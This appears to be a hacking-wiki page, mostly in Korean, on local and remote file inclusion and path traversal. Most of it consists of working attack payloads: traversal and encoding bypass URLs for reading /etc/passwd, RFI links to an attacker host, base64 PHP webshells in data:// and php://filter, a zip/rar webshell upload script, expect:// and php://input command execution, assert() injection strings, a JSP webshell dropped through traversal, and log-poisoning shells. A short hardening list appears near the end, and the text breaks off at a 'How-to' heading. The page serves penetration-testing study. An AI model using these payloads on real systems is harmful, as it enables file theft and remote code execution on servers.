# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** 파일이 원격 서버에서 로드됩니다 (장점: 코드를 작성하면 서버가 이를 실행합니다). php에서는 기본적으로 **비활성화되어 있습니다** (**allow_url_include**).\
**Local File Inclusion (LFI):** 서버가 로컬 파일을 로드합니다.

이 취약점은 사용자가 서버가 로드할 파일을 어떤 식으로든 제어할 수 있을 때 발생합니다.

취약한 **PHP functions**: require, require_once, include, include_once

이 취약점을 악용하기 위한 흥미로운 도구: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**여러 \*nix LFI 목록을 결합하고 경로를 추가하여 이 목록을 만들었습니다:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

또한 `/`을 `\`로 바꿔보세요\
또한 `../../../../../`를 추가해 보세요

취약점 존재 여부를 확인하기 위해 여러 기법을 사용해 /etc/password 파일을 찾는 목록은 [여기](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)에서 찾을 수 있습니다

### **Windows**

여러 wordlists의 병합:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

또한 `/`을 `\`로 바꿔보세요\
또한 `C:/`를 제거하고 `../../../../../`를 추가해 보세요

취약점 존재 여부를 확인하기 위해 여러 기법을 사용해 /boot.ini 파일을 찾는 목록은 [여기](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)에서 찾을 수 있습니다

### **OS X**

Linux의 LFI 목록을 확인하세요.

## Basic LFI and bypasses

모든 예제는 Local File Inclusion에 관한 것이지만 Remote File Inclusion에도 적용될 수 있습니다 (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences가 비재귀적으로 제거됨
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

제공된 문자열 끝에 추가 문자를 덧붙이는 동작을 Bypass (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
이는 **PHP 5.4부터 해결되었습니다**

### **인코딩**

비표준 인코딩(예: double URL encode 등)을 사용할 수 있습니다:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

Modern HTML-to-PDF engines (e.g. **TCPDF** or wrappers such as **html2pdf**) happily parse attacker-provided HTML, SVG, CSS, and font URLs, yet they run inside trusted backend networks with filesystem access. Once you can inject HTML into `$pdf->writeHTML()`/`Html2Pdf::writeHTML()`, you can often exfiltrate local files that the web server account can read.

- **Fingerprint the renderer**: 생성된 모든 PDF는 `Producer` 필드(예: `TCPDF 6.8.2`)를 포함합니다. 정확한 빌드를 알면 어떤 경로 필터가 존재하는지, URL 디코딩이 검증 전에 수행되는지 알 수 있습니다.
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()`는 `urldecode()`를 실행하기 전에 `<image>` 요소의 `xlink:href` 속성을 읽습니다. 악성 SVG를 data URI 안에 포함하면 많은 HTML 정화기들이 페이로드를 무시하지만 TCPDF는 여전히 이를 파싱합니다:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDF는 `/`로 시작하는 경로에 `$_SERVER['DOCUMENT_ROOT']`를 미리 붙이고 `..`는 나중에 해석하므로, prepend 후 루트를 벗어나려면 선행으로 `../../..` 세그먼트나 `/../../..`를 사용하세요.
- **Encoding to bypass naive filters**: Versions ≤6.8.2는 URL을 디코딩하기 *전에* 리터럴 부분 문자열 `../`만 검사합니다. SVG 또는 원시 `<img src>` 속성에 `..%2f`(또는 `..%2F`)를 전송하면 TCPDF가 `urldecode()`를 호출한 뒤에야 traversal인 `../` 시퀀스가 재생성되므로 검사를 우회할 수 있습니다.
- **Double-encoding for multi-stage decoding**: 웹 프레임워크에서 한 번, TCPDF에서 또 한 번 사용자 입력을 디코딩하는 환경이라면 슬래시를 이중 인코딩(`%252f`)하세요. 한 번의 디코딩으로 `%2f`가 되고, TCPDF에서의 두번째 디코딩으로 `/`가 되어 `/..%252f..` → `/../../../…`처럼 되며 초기 필터에 `../`가 노출되지 않습니다.
- **HTML `<img>` handler**: `TCPDF::openHTMLTagHandler()`는 동일한 순서 문제 버그를 포함하고 있어 `src="%2f..%252f..%252ftmp%252fsecret.png"` 같은 직접 HTML 페이로드로 로컬에서 접근 가능한 비트맵을 읽을 수 있습니다.

This technique leaks anything readable by the PDF worker (passport scans, API keys rendered as images, etc.). Hardeners fixed it in 6.9.1 by canonicalising paths (`isRelativePath()`), so during tests prioritise older `Producer` versions.

### From existent folder

백엔드가 폴더 경로를 검사하고 있을 수 있습니다:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 서버의 파일 시스템 디렉토리 탐색

서버의 파일 시스템은 특정 기법을 사용해 파일뿐 아니라 디렉토리도 재귀적으로 탐색할 수 있습니다. 이 과정은 디렉토리 깊이를 파악하고 특정 폴더의 존재 여부를 확인하는 작업을 포함합니다. 아래는 이를 달성하기 위한 상세한 방법입니다:

1. **디렉토리 깊이 파악:** 현재 디렉토리의 깊이는 `/etc/passwd` 파일을 성공적으로 가져와서 확인합니다 (서버가 Linux 기반인 경우에 해당). 예시 URL은 다음과 같이 구성될 수 있으며, 깊이가 세 단계임을 나타냅니다:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **폴더 탐색:** 의심되는 폴더 이름(예: `private`)을 URL에 추가한 다음 `/etc/passwd`로 다시 이동합니다. 추가된 디렉터리 레벨 때문에 depth를 하나 증가시켜야 합니다:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpret the Outcomes:** 서버의 응답은 해당 폴더의 존재 여부를 표시합니다:
- **오류 / 출력 없음:** 폴더 `private`는 지정된 위치에 존재하지 않을 가능성이 높습니다.
- **`/etc/passwd`의 내용:** `private` 폴더의 존재가 확인됩니다.
4. **재귀적 탐색:** 발견된 폴더는 동일한 기법이나 기존의 Local File Inclusion (LFI) 방법을 사용해 하위 디렉터리나 파일을 추가로 탐색할 수 있습니다.

For exploring directories at different locations in the file system, adjust the payload accordingly. For instance, to check if `/var/www/` contains a `private` directory (assuming the current directory is at a depth of 3), use:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation은 웹 애플리케이션에서 파일 경로를 조작하기 위해 사용되는 방법이다. 보안 조치가 파일 경로 끝에 추가 문자를 붙여 접근을 차단할 때 이를 우회해 제한된 파일에 접근하는 데 자주 쓰인다. 목표는 보안 조치로 인해 변경된 이후에도 여전히 원하는 파일을 가리키는 파일 경로를 만드는 것이다.

In PHP에서는 파일 시스템 특성상 여러 표현의 파일 경로가 동일하게 취급될 수 있다. 예를 들면:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, 그리고 `/etc/passwd/`는 모두 동일한 경로로 처리된다.
- 마지막 6글자가 `passwd`일 때 `/`를 덧붙여 `passwd/`로 만들어도 대상 파일은 변경되지 않는다.
- 마찬가지로 파일 경로에 `.php`가 붙는 경우(예: `shellcode.php`) 끝에 `/.`를 추가해도 접근되는 파일은 바뀌지 않는다.

다음 예시들은 Path truncation을 이용해 `/etc/passwd`에 접근하는 방법을 보여준다. `/etc/passwd`는 민감한 내용(사용자 계정 정보)을 담고 있어 흔히 타깃이 된다:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
이러한 시나리오에서는 필요한 traversals 수가 약 2027개 정도일 수 있지만, 이 숫자는 서버 구성에 따라 달라질 수 있습니다.

- **Using Dot Segments and Additional Characters**: `../` 시퀀스와 추가 dot segments 및 문자들을 결합하여 파일 시스템을 탐색할 수 있으며, 서버가 덧붙인 문자열을 무시하도록 만들 수 있습니다.
- **Determining the Required Number of Traversals**: 시도와 오류를 통해 루트 디렉터리로 이동한 다음 `/etc/passwd`에 도달하는 데 필요한 정확한 `../` 시퀀스 수를 찾아, `.php` 같은 덧붙여진 문자열을 무력화하면서도 원하는 경로(`/etc/passwd`)는 유지되도록 할 수 있습니다.
- **Starting with a Fake Directory**: 경로를 존재하지 않는 디렉터리(예: `a/`)로 시작하는 것은 일반적인 관행입니다. 이 기법은 예방 조치로 사용되거나 서버의 경로 파싱 로직 요구사항을 충족시키기 위해 사용됩니다.

path truncation techniques를 사용할 때에는 서버의 경로 파싱 동작과 파일시스템 구조를 이해하는 것이 중요합니다. 각 시나리오마다 다른 접근이 필요할 수 있으며, 가장 효과적인 방법을 찾기 위해 테스트가 자주 필요합니다.

**이 취약점은 PHP 5.3에서 수정되었습니다.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php에서는 기본적으로 비활성화되어 있습니다. 그 이유는 **`allow_url_include`**가 **Off.**이기 때문입니다. 작동하려면 **On**이어야 하며, 그 경우 서버의 PHP 파일을 포함하여 RCE를 얻을 수 있습니다:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
만약 어떤 이유로 **`allow_url_include`**가 **On**이고, PHP가 외부 웹페이지 접근을 **filtering**하고 있다면, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), 예를 들어 data protocol과 base64를 사용해 b64 PHP 코드를 디코드하여 RCE를 얻을 수 있습니다:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 이전 코드에서, 마지막의 `+.txt`는 attacker가 `.txt`로 끝나는 문자열을 필요로 했기 때문에 추가되었습니다. 그래서 문자열은 그로 끝나며, b64 decode 후 그 부분은 단순한 junk를 반환하고 실제 PHP 코드는 포함되어(따라서 실행됩니다).
 
다른 예제 **`php://` 프로토콜을 사용하지 않는** 경우는 다음과 같습니다:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python 루트 요소

다음과 같은 Python 코드에서는:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
사용자가 **absolute path**를 **`file_name`**에 전달하면, **이전 경로는 단순히 제거됩니다**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
이것은 [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)에 따른 의도된 동작입니다:

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

## Java 디렉터리 목록

보이는 바에 따르면, Java에서 Path Traversal이 있고 파일 대신 **디렉터리를 요청하면**, **디렉터리 목록이 반환됩니다**. 다른 언어에서는(내가 알기로는) 이런 일이 발생하지 않습니다.

## 상위 25개 파라미터

다음은 local file inclusion (LFI) 취약점에 노출될 수 있는 상위 25개 파라미터 목록입니다 (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI: PHP wrappers 및 프로토콜 사용

### php://filter

PHP filters는 읽거나 쓰기 전에 데이터에 대해 기본적인 **수정 작업**을 수행할 수 있게 해줍니다. 필터는 5가지 범주로 나뉩니다:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: 데이터에서 태그 제거 (`"<"`와 `">"` 문자 사이의 모든 내용)
- 이 필터는 최신 PHP 버전에서는 사라졌습니다
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 다른 인코딩으로 변환(`convert.iconv.<input_enc>.<output_enc>`). **지원되는 모든 인코딩의 목록**을 얻으려면 콘솔에서 `iconv -l`을 실행하세요.

> [!WARNING]
> `convert.iconv.*` 변환 필터를 악용하면 **임의의 텍스트를 생성**할 수 있으며, 이는 임의의 텍스트를 작성하거나 include 같은 함수가 임의의 텍스트를 처리하도록 만드는 데 유용할 수 있습니다. 자세한 내용은 [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md)를 확인하세요.

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: 콘텐츠를 압축함 (많은 정보를 exfiltrating할 때 유용)
- `zlib.inflate`: 데이터를 압축 해제함
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 더 이상 사용되지 않음
- `mdecrypt.*` : 더 이상 사용되지 않음
- Other Filters
- PHP에서 `var_dump(stream_get_filters());`를 실행하면 몇 가지 **예상치 못한 필터**를 찾을 수 있습니다:
- `consumed`
- `dechunk`: HTTP chunked encoding을 역변환
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" 부분은 대소문자를 구분하지 않습니다

### php filters를 oracle로 사용해 임의의 파일 읽기

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)는 서버로부터 출력이 반환되지 않아도 로컬 파일을 읽는 기술을 제안합니다. 이 기법은 **boolean exfiltration of the file (char by char) using php filters**를 oracle로 사용하는 것에 기반합니다. 이는 php filters가 텍스트를 충분히 크게 만들어 php가 예외를 발생시키게 할 수 있기 때문입니다.

원문 포스트에서 기법에 대한 자세한 설명을 볼 수 있지만, 여기서는 간단한 요약을 제공합니다:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- 이는 초기 문자가 올바르게 추측되었을 때 **php가 오류를 발생시킬 만큼 매우 큰 텍스트**를 생성하는 데 사용됩니다.
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- 이 필터와 이전 필터(및 추측된 문자에 따라 사용하는 다른 필터)를 조합하면, 충분한 변환을 적용했을 때 그 문자가 hexadecimal 문자가 아니게 되는 시점을 관찰하여 텍스트의 첫 문자를 추측할 수 있습니다. 만약 hex라면 dechunk가 삭제하지 않고 초기 폭발이 php 오류를 유발합니다.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- 시작에 **rot13** 같은 다른 변환을 사용하면 n, o, p, q, r 같은 다른 문자를 leak할 수 있습니다 (그리고 다른 코덱들은 다른 문자들을 hex 범위로 이동시키는 데 사용될 수 있습니다).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- 최종 문제는 **how to leak more than the initial letter**입니다. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** 같은 order memory 필터를 사용하면 문자들의 순서를 바꿔 텍스트의 다른 문자를 첫 위치로 가져올 수 있습니다.
- 그리고 추가 데이터를 얻기 위해서는 **convert.iconv.UTF16.UTF16**으로 **처음에 2 bytes의 junk data를 생성**하고, **UCS-4LE**를 적용하여 그것을 다음 2 bytes와 **pivot**시키고, 데이터를 junk data까지 **삭제**하는 방식(이렇게 하면 초기 텍스트의 첫 2 bytes가 제거된다)을 사용합니다. 원하는 비트를 leak할 때까지 이 과정을 반복합니다.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr**를 사용하여 각각 **file descriptors 0, 1 and 2**에 접근할 수 있습니다 (이것이 attack에 어떻게 유용할지는 확실하지 않음)

### zip:// and rar://

PHPShell이 들어있는 Zip 또는 Rar 파일을 업로드하고 접근하세요.\
rar protocol을 악용하려면 **명시적으로 활성화되어야 합니다**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
이 프로토콜은 php 설정 **`allow_url_open`** 및 **`allow_url_include`** 에 의해 제한된다는 점에 유의하세요

### expect://

Expect는 활성화되어 있어야 합니다. 다음을 사용해 코드를 실행할 수 있습니다:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parameters에 payload를 지정하세요:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

웹 애플리케이션이 파일 로딩에 `include` 같은 함수를 사용할 때, `.phar` 파일은 PHP 코드를 실행하는 데 이용될 수 있다. 아래의 PHP 코드 스니펫은 `.phar` 파일을 생성하는 예를 보여준다:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` 파일을 컴파일하려면 다음 명령어를 실행해야 합니다:
```bash
php --define phar.readonly=0 create_path.php
```
실행하면 `test.phar`라는 파일이 생성되며, 이는 Local File Inclusion (LFI) 취약점을 악용하는 데 잠재적으로 이용될 수 있습니다.

LFI가 내부의 PHP 코드를 실행하지 않고 `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, `filesize()` 같은 함수들을 통해 단순히 파일을 읽기만 하는 경우, deserialization 취약점의 악용을 시도할 수 있습니다. 이 취약점은 `phar` 프로토콜을 사용한 파일 읽기와 관련되어 있습니다.

자세한 이해를 위해 아래 문서를 참조하세요:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

PHP에서 php filters를 지원하는 임의의 파일 읽기를 악용하여 RCE를 얻을 수 있었습니다. 자세한 설명은 [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
아주 간단한 요약: PHP 힙에서의 **3 byte overflow**를 이용해 특정 크기의 자유 청크 체인을 **alter**하여 임의 주소에 **무엇이든 쓸 수 있도록** 했고, 이를 위해 **`system`**을 호출하는 훅을 추가했습니다.\
특정 크기의 청크를 할당하기 위해 추가적인 php filters를 악용할 수 있었습니다.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 메모리나 임시 파일에 작성 (file inclusion attack에서 어떻게 유용할지는 확실하지 않음)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — 로컬 파일시스템 접근
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL 접근
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL 접근
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 압축 스트림
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 패턴과 일치하는 경로명 검색 (출력 가능한 내용을 반환하지 않으므로 여기서는 크게 유용하지 않음)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 오디오 스트림 (임의 파일 읽기에 유용하지 않음)

## LFI via PHP's 'assert'

PHP에서 문자열 내 코드를 실행할 수 있는 'assert' 함수를 다룰 때 Local File Inclusion (LFI) 위험이 특히 큽니다. 입력에 ".." 같은 디렉토리 트래버설 문자가 포함되어 있는지를 검사하지만 적절히 정제하지 않는 경우 특히 문제가 됩니다.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
이 방식은 traversal를 막으려는 목적이지만, 의도치 않게 code injection을 위한 벡터를 만듭니다. 파일 내용을 읽기 위해 이를 악용하려면 공격자는 다음과 같은 것을 사용할 수 있습니다:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
유사하게, 임의의 시스템 명령을 실행하려면 다음을 사용할 수 있다:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> 이 기법은 파일의 내용이 보이지 않는 경우(예: 간단한 호출 **`file()`**)에도 **control**할 수 있는 **file path**를 가진 **PHP function**이 **access a file**할 때 관련됩니다.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

요약하면, 이 기법은 **"UCS-4LE" encoding**을 사용해 파일의 내용을 매우 **big**하게 만들어 그 파일을 여는 **PHP function opening**이 **error**를 발생시키게 합니다.

그 다음, 첫 문자를 leak하기 위해 필터 **`dechunk`**이 사용되며 **base64** 또는 **rot13** 같은 다른 필터들과 함께 사용되고, 마지막에는 **convert.iconv.UCS-4.UCS-4LE**와 **convert.iconv.UTF16.UTF-16BE** 필터가 사용되어 **place other chars at the beggining and leak them**.

취약할 수 있는 함수들: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

기술적 세부사항은 앞의 포스트를 확인하세요!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

서버 측 코드가 파일을 수신/업로드하면서 대상 경로를 사용자 제어 데이터(예: a filename 또는 URL)를 canonicalising 및 검증 없이 구성하면, `..` segments와 absolute paths가 의도한 디렉터리를 벗어나 임의의 파일 쓰기를 일으킬 수 있습니다. 만약 payload를 웹에 노출된 디렉터리에 배치할 수 있다면, 보통 webshell을 떨어뜨려 인증 없는 RCE를 얻습니다.

Typical exploitation workflow:
- 경로/파일명을 받아 디스크에 내용을 쓰는 엔드포인트나 백그라운드 워커에서 write primitive를 식별합니다(예: 메시지 기반 ingestion, XML/JSON command handlers, ZIP extractors 등).
- 웹에 노출된 디렉터리를 파악합니다. 일반적인 예:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 의도된 저장 디렉터리에서 webroot로 빠져나오도록 traversal 경로를 만들고, webshell 내용을 포함합니다.
- 배포된 payload에 접속해 명령을 실행합니다.

참고:
- 쓰기를 수행하는 취약 서비스는 비-HTTP 포트에서 대기할 수 있습니다(예: TCP 4004의 JMF XML listener). 메인 웹 포털(다른 포트)이 나중에 당신의 payload를 서빙할 수 있습니다.
- Java 스택에서는 이러한 파일 쓰기가 종종 단순한 `File`/`Paths` 연결로 구현됩니다. canonicalisation/allow-listing의 부재가 핵심 결함입니다.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
하드닝(이 클래스의 취약점을 방어하는 방법):
- 정규화된(canonical) 경로로 변환하고, 허용 목록에 있는 기본 디렉터리(allow-listed base directory)의 하위인지 강제 검사한다.
- `..`, absolute roots, 또는 drive letters를 포함한 경로는 거부한다; generated filenames을 선호한다.
- writer를 low-privileged 계정으로 실행하고, 쓰기 디렉터리를 served roots와 분리한다.

## Remote File Inclusion

이전에 설명됨, [**follow this link**](#remote-file-inclusion).

### Apache/Nginx 로그 파일을 통해

Apache 또는 Nginx 서버가 include 함수 내부에서 **vulnerable to LFI**라면, **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**에 접근을 시도해, **user agent**나 **GET parameter**에 **`<?php system($_GET['c']); ?>`** 같은 php shell을 넣고 그 파일을 include할 수 있다.

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> 또한, 반드시 **write correctly the payload** 해야 하며, 그렇지 않으면 PHP가 로그 파일을 불러올 때마다 오류가 발생하고 두 번째 기회는 주어지지 않는다.

이것은 다른 로그에서도 가능하지만 **be careful,** 로그 내부의 코드가 URL encoded되어 Shell이 손상될 수 있다. 헤더 **authorisation "basic"**은 Base64로 인코딩된 "user:password"를 포함하고 로그 안에서 디코드된다. PHPShell은 이 헤더 안에 삽입할 수 있다.\
다른 가능한 로그 경로:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 액세스 로그를 읽어 GET-based auth tokens (token replay) 수집

많은 앱들이 실수로 GET을 통해 session/auth tokens를 수락합니다 (예: AuthenticationToken, token, sid). path traversal/LFI primitive로 web server logs에 접근할 수 있다면, access logs에서 해당 토큰을 훔쳐 재사용(replay)하여 authentication을 완전히 우회할 수 있습니다.

How-to:
